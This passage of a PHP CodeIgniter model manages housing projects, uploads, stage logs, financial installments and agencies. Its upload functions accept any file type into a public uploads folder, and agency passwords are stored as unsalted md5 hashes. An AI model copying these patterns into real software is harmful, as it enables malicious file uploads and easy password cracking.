        $this->db->join('districts_master districts','districts.id = ps.district_id','left');
        $this->db->join('cities_master cities','cities.id = ps.city_id','left');
        $this->db->where('code',$project_code);
        $this->db->where('ps.id',$project_id);
        $project_details = $this->db->get('projects ps')->row_array();

        return $project_details;
    }


    function get_consultant_details($project_id)
    {
        $this->db->select('consultants.*');
        $this->db->where('consultants.project_id',$project_id);
        $consultant_details = $this->db->get('project_consultant_details consultants')->result_array();

        return $consultant_details;
    }


    function get_documents($project_id)
    {
        $this->db->select('project_uploaded_documents.* , dm.name as document_master_name');
        $this->db->join('project_documents_master dm','dm.id = project_uploaded_documents.document_id','left');
        $this->db->where('project_id',$project_id);
        $this->db->order_by('project_uploaded_documents.created_at','DESC');
        return $this->db->get('project_uploaded_documents')->result_array();
    }


    function get_documents_master()
    {

        $this->db->select('*');
        $this->db->order_by('name','ASC');       
        return $this->db->get('project_documents_master')->result_array();
    }

    function upload_document($project_id,$document_name,$document_id,$encrypted_url)
    {
        $config['upload_path'] = FCPATH.'public/uploads';
        $config['allowed_types'] ='*';
        $config['file_name'] = generate_unique_id();
        $this->load->library('upload', $config);

        if($this->upload->do_upload('doc_file'))
        {
            $uploaded = $this->upload->data();

            $doc_array = array(
                'project_id' => $project_id,
                'document_id' => $document_id,
                'document_name' =>  $document_name,
                'document_path' => $uploaded['file_name'],
                'uploaded_by_user_id' => $this->session->userdata('id_of_user'),
                'created_at' => date('Y-m-d H:i:s')
            );

            $this->db->insert('project_uploaded_documents',$doc_array);
            return 1;
        }
        else{
            $error = array('error' => $this->upload->display_errors());
            $this->session->set_flashdata('error',$error['error']);
            redirect('projects/documents/'.$encrypted_url);

        }
    }

    function delete_project_document($doc_id)
    {
        $this->db->where('id',$doc_id);
        $this->db->delete('project_uploaded_documents');
    }

    function get_uploaded_photos($project_id)
    {
        $this->db->select('project_uploaded_photos_videos.* , sm.stage as stage_master_name');
        $this->db->join('project_stages_master sm','sm.id = project_uploaded_photos_videos.stage_id','left');
        $this->db->where('project_id',$project_id);
        $this->db->order_by('project_uploaded_photos_videos.created_at','DESC');
        return $this->db->get('project_uploaded_photos_videos')->result_array();
    }


    function upload_project_photo_video($project_id,$postData,$encrypted_url)
    {
        $config['upload_path'] = FCPATH.'public/uploads';
        $config['allowed_types'] = '*';
        $config['file_name'] = generate_unique_id();
        $this->load->library('upload', $config);

        if($this->upload->do_upload('photo_file'))
        {
            $uploaded = $this->upload->data();

            $doc_array = array(
                'project_id' => $project_id,
                'stage_id' => $postData['doc_stage'],
                'upload_type' => $postData['doc_type'],
                'upload_path' => $uploaded['file_name'],
                'uploaded_by_user_id'=> $this->session->userdata('id_of_user'),
                'created_at' => date('Y-m-d H:i:s')
            );

            $this->db->insert('project_uploaded_photos_videos',$doc_array);
            return 1;
        }
        else{
            $error = array('error' => $this->upload->display_errors());
            $this->session->set_flashdata('error',$error['error']);
            redirect('projects/photos/'.$encrypted_url);
        }
    }

    function get_stages_master()
    {
        $master_records = $this->db->get('project_stages_master')->result_array();
        return $master_records;
    }

    function delete_photos_videos($photo_id)
    {
        $this->db->where('id',$photo_id);
        $this->db->delete('project_uploaded_photos_videos');
    }

    function get_statuses_master()
    {
        $master_records = $this->db->get('project_statuses_master')->result_array();
        return $master_records;
    }

    function update_project_status($project_id,$development_status,$start_date_of_project,$tentative_completion_date_of_project,$user_id)
    {
        $this->db->select('ps.current_status_id,sm.status as development_status_name');
        $this->db->join('project_statuses_master sm','sm.id = ps.current_status_id','left');
        $this->db->where('ps.id',$project_id);
        $current_status = $this->db->get('projects ps')->row_array();

        $this->db->select('status');
        $this->db->where('id',$development_status);
        $new_status_name = $this->db->get('project_statuses_master')->row('name');

        if($development_status == $current_status['current_status_id'])
        {
            return false;
        }

        $this->db->where('id',$project_id);
        $this->db->update('projects',array('current_status_id' => $development_status));

        $log_array = array(
            'project_id' => $project_id,
            'status_id' => $development_status,
            'start_date_of_project' => $start_date_of_project,
            'tentative_completion_date_of_project' => $tentative_completion_date_of_project	,
            'created_at' => date('Y-m-d H:i:s'),
            'updated_by_user_id' => $user_id
        );

        $this->db->insert('project_status_log',$log_array);

        return true;
    }

    public function add_stages_log($postData,$encrypted_url)
    {


        $config['upload_path'] = FCPATH.'public/uploads';
        $config['allowed_types'] = '*';
        $config['file_name'] = generate_unique_id();
        $this->load->library('upload', $config);

        if (empty($_FILES['beneficiary_list_path']['name'])) {
            $postData['created_at'] = date('Y-m-d H:i:s');
            $inserted_id = $this->db->insert('project_stages_log', $postData);

            return 1;
        }
        else {
            if ($this->upload->do_upload('beneficiary_list_path')) {
                $uploaded = $this->upload->data();
                $postData['beneficiary_list_path'] = $uploaded['file_name'];
                $postData['created_at'] = date('Y-m-d H:i:s');
                $inserted_id = $this->db->insert('project_stages_log', $postData);

                return 1;
            } else {
                $error = array('error' => $this->upload->display_errors());
                $this->session->set_flashdata('error', $error['error']);
                redirect('projects/update_project_stage/' . $encrypted_url);
            }
        }



    }


    function get_project_stages_dus_details($project_id)
    {
        $this->db->select('psd.*,stages.stage as project_stage');
        $this->db->join('project_stages_master stages','stages.id = psd.stage_id','left');
        $this->db->where('psd.project_id',$project_id);
        $project_stages_dus_details = $this->db->get('project_stages_dus_details psd')->result_array();

        return $project_stages_dus_details;
    }


    public function save_stage_details($postData,$stages_master)
    {
        foreach($stages_master as $stage)
        {

            $this->db->where('project_id', $postData['project_id']);
            $this->db->where('stage_id', $stage['id']);
            $q = $this->db->get('project_stages_dus_details');
            $this->db->reset_query();

            $insertArr =[
                "project_id" => $postData['project_id'],
                "stage_id" => $stage['id'],
                "no_of_dus" => $postData['stage_dus'][$stage['id']]['no_of_dus'],
                "additional_information" => $postData['stage_dus'][$stage['id']]['additional_information'],
                "created_at" => date('Y-m-d H:i:s')
            ];



            if ( $q->num_rows() > 0 )
            {
                $this->db->where('project_id', $postData['project_id']);
                $this->db->where('stage_id', $stage['id'])->update('project_stages_dus_details', $insertArr);

            } else {
                $this->db->insert('project_stages_dus_details', $insertArr);
            }


        }
    }

    public function get_dus_started_count($project_id)
    {
        $this->db->select_sum('total_dus_work_started');
        $this->db->from('project_stages_log');
        $this->db->where('project_id',$project_id);
        $query = $this->db->get();
        return $query->row()->total_dus_work_started;
    }
    public function get_dus_started($project_id)
    {
        $this->db->select_sum('EWS');
        $this->db->select_sum('LIG');
        $this->db->select_sum('MIG');
        $this->db->select_sum('HIG');
        $this->db->select_sum('total_dus_work_started');
        $this->db->where('project_id',$project_id);
        $master_records = $this->db->get('project_stages_log')->result_array();
        return $master_records;


    }

    public function add_financial_details($postData,$categoryArr,$encrypted_url)
    {
        foreach($categoryArr as $category)
        {
            $postData[$category.'_amount'] = $postData['financial_details'][$category]['amount'];
            $postData[$category.'_goi_order_no'] = $postData['financial_details'][$category]['goi_order_no'];
            $postData[$category.'_goi_order_date'] = $postData['financial_details'][$category]['goi_order_date'];

            $postData[$category.'_gom_order_no'] = $postData['financial_details'][$category]['gom_order_no'];
            $postData[$category.'_gom_order_date'] = $postData['financial_details'][$category]['gom_order_date'];
            $postData[$category.'_mhada_order_no'] = $postData['financial_details'][$category]['mhada_order_no'];
            $postData[$category.'_mhada_order_date'] = $postData['financial_details'][$category]['mhada_order_date'];
            $postData[$category.'_utilization_amount'] = $postData['financial_details'][$category]['utilization_amount'];

        }

            unset($postData['gom_financial_details']);
            unset($postData['gom_total_amount']);
            unset($postData['gom_total_utilization_amount']);

            unset($postData['financial_details']);
            unset($postData['save_financial_details']);

            $this->db->where('project_id', $postData['project_id']);
            $this->db->where('nodel_agency', $postData['nodel_agency']);
            $this->db->where('installment', $postData['installment']);
            $q = $this->db->get('project_financial_details');
            $this->db->reset_query();


            if ( $q->num_rows() > 0 )
            {
                $postData['updated_at'] = date('Y-m-d H:i:s');
                $this->db->where('project_id', $postData['project_id']);
                $this->db->where('nodel_agency', $postData['nodel_agency']);
                $this->db->where('installment', $postData['installment'])->update('project_financial_details', $postData);

            } else {

                $postData['created_at'] = date('Y-m-d H:i:s');
                $this->db->insert('project_financial_details', $postData);
            }



    }

    public function add_gom_financial_details($postData,$categoryArr,$encrypted_url)
    {
        unset($postData['total_amount']);
        unset($postData['total_utilization_amount']);
        unset($postData['financial_details']);

        foreach($categoryArr as $category)
        {
            $postData[$category.'_amount'] = $postData['gom_financial_details'][$category]['amount'];
            $postData[$category.'_gom_order_no'] = $postData['gom_financial_details'][$category]['gom_order_no'];
            $postData[$category.'_gom_order_date'] = $postData['gom_financial_details'][$category]['gom_order_date'];
            $postData[$category.'_mhada_order_no'] = $postData['gom_financial_details'][$category]['mhada_order_no'];
            $postData[$category.'_mhada_order_date'] = $postData['gom_financial_details'][$category]['mhada_order_date'];
            $postData[$category.'_utilization_amount'] = $postData['gom_financial_details'][$category]['utilization_amount'];

        }

            $postData['total_amount'] = $postData['gom_total_amount'];
            $postData['total_utilization_amount'] = $postData['gom_total_utilization_amount'];




        unset($postData['gom_total_amount']);
        unset($postData['gom_total_utilization_amount']);

        unset($postData['gom_financial_details']);
        unset($postData['save_financial_details']);

        $this->db->where('project_id', $postData['project_id']);
        $this->db->where('nodel_agency', $postData['nodel_agency']);
        $this->db->where('installment', $postData['installment']);
        $q = $this->db->get('project_financial_details');
        $this->db->reset_query();


        if ( $q->num_rows() > 0 )
        {
            $postData['updated_at'] = date('Y-m-d H:i:s');
            $this->db->where('project_id', $postData['project_id']);
            $this->db->where('nodel_agency', $postData['nodel_agency']);
            $this->db->where('installment', $postData['installment'])->update('project_financial_details', $postData);

        } else {

            $postData['created_at'] = date('Y-m-d H:i:s');
            $this->db->insert('project_financial_details', $postData);
        }



    }

    public function get_financial_details($project_id,$nodel_agency_id)
    {
        $this->db->where('project_id', $project_id);
        $this->db->where('nodel_agency', $nodel_agency_id);
        $this->db->order_by('installment','ASC');
        $q = $this->db->get('project_financial_details')->result_array();

        return $q;
    }


    public function get_fund_amount($project_id,$nodel_agency_id)
    {
        $this->db->select('total_amount');
        $this->db->where('project_id', $project_id);
        $this->db->where('nodel_agency', $nodel_agency_id);
        $this->db->order_by('installment','ASC');
        $q = $this->db->get('project_financial_details')->result_array();

        return $q;
    }

    function get_all_agencies($search_param,$user_id)
    {
        $today = date('Y-m-d H:i:s');

        $agent_count = $this->db->get('agencies as')->num_rows();

        $this->db->select('as.*');


        $this->db->order_by('created_at','DESC');
        $agent_details = $this->db->get('agencies as')->result_array();

        return array(
            'agent_count' => $agent_count,
            'Agencies' => $agent_details
        );
    }


    function get_agency_project_details($agency_id)
    {
        $this->db->select('ps.*, districts.name as district, cities.name as city');
        $this->db->join('districts_master districts','districts.id = ps.district_id','left');
        $this->db->join('cities_master cities','cities.id = ps.city_id','left');
        $this->db->where('ps.agency_id',$agency_id);
        $project_details = $this->db->get('projects ps')->result_array();

        return $project_details;
    }


    function add_agency($postData)
    {

        unset($postData['confirm_password']);
        $postData['password'] =  md5($postData['password']);
        $postData['created_at'] = date('Y-m-d H:i:s');
        $inserted_id = $this->db->insert('agencies',$postData);

    }

    function get_agency_details($agency_id)
    {
        $this->db->where('id',$agency_id);
        $agency_details = $this->db->get('agencies')->result_array();

        return $agency_details;
    }

    function get_projects_to_assign($agency_id)
    {
        $this->db->where('agency_id',$agency_id);
        $this->db->or_where('agency_id',0);
        $projects_list = $this->db->get('projects')->result_array();

        return $projects_list;
    }

    function add_agency_projects($postData)
    {
        foreach($postData['project_ids'] as $project_id)
        {
            $update_data = array(
                'agency_id' => $postData['agency_id']
            );
            $this->db->update('projects', $update_data, array('id' => $project_id));
        }
    }

    function remove_project($project_id)
    {
        $update_data = array(
            'agency_id' => 0
        );
        $this->db->update('projects', $update_data, array('id' => $project_id));
    }

    function get_status_abstract_details()
    {
        $this->db->select('statuses.status,statuses.id As status_id,count(ps.id) AS status_count');
        $this->db->join('project_statuses_master statuses','statuses.id = ps.current_status_id','left');
        $this->db->group_by("current_status_id");
        $status_abstract_details = $this->db->get('projects ps')->result_array();

        return $status_abstract_details;
    }

    public function get_total_project_count()
    {
        $this->db->select('count(id) AS project_count');
        $project_count = $this->db->get('projects')->result_array();

        return $project_count;
    }
 }

